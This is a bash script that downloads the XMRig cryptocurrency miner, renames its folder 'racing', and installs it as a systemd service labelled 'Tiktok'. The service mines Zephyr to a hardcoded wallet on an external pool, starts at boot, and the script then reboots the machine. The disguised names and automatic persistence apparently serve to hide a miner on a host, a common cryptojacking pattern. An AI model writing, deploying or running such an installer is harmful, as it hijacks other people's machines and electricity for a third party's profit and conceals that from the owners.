#!/bin/bash

generate_random_number() {
  echo $((1000 + RANDOM % 9000))
}
generate_workername() {
  local random_number=$(generate_random_number)
  echo "jobs${random_number}"
}
worker_thread=7
worker_name=$(generate_workername)

cd /home
sudo wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz
# Update package lists
sudo apt update
# Extract the tar.gz file
sudo tar xvzf xmrig-6.21.3-linux-static-x64.tar.gz
# Move the xmrig directory to racing
sudo mv xmrig-6.21.3 racing
sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing/xmrig --donate-level 1 -o de.zephyr.herominers.com:1123 -u ZEPHYR3eByAcNNfyKzfAHtJaoTrJ3nnfn4qZSjAX4SPT14wYvNmne8jaei24JjUXpb1WrPqNgXgaVCVZr1Cy566NCdB7YL3juVa51 -p '$worker_name' -a rx/0 -k\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/tiktok.service'
sudo systemctl daemon-reload
sudo systemctl enable tiktok.service
echo "Setup completed!"
sudo reboot
